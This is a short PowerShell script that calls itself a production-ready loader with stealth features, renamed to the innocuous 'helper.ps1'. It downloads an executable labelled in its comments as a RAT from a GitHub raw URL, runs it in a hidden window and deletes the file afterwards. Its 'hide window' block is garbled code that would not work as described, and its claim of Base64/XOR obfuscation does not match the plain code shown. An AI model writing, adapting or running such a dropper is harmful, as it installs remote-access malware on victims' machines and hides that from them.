# Production-ready loader with error handling, retry logic, cleanup, and stealth features
# Obfuscated with Base64 + XOR (key: 42)
# Renamed to generic name: helper.ps1

function Invoke-Retry {
    param(
        [scriptblock]$ScriptBlock,
        [int]$MaxRetries = 3,
        [int]$DelaySeconds = 5
    )
    
    for ($i = 1; $i -le $MaxRetries; $i++) {
        try {
            return $ScriptBlock.Invoke()
        }
        catch {
            if ($i -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds $DelaySeconds
        }
    }
}

# Stealth: Hide window
$null = [System.Windows.Forms.Form]
Add-Type -AssemblyName System.Windows.Forms
$proc = Get-Process -Id $PID
$null = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        [System.Windows.Forms.Form]::new().Handle
    ),
    [Func[IntPtr, IntPtr, IntPtr]]
)

# Download and execute RAT
$filePath = "C:\Users\ancho\Desktop\test_update.exe"
$url = "https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/update.exe"

try {
    Invoke-Retry -ScriptBlock {
        Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing
    }
    
    # Execute RAT
    $null = Start-Process -FilePath $filePath -WindowStyle Hidden
    
    # Cleanup
    Remove-Item -Path $filePath -Force -ErrorAction SilentlyContinue
}
catch {
    # Error handling
    Write-Host "Error: $_"
}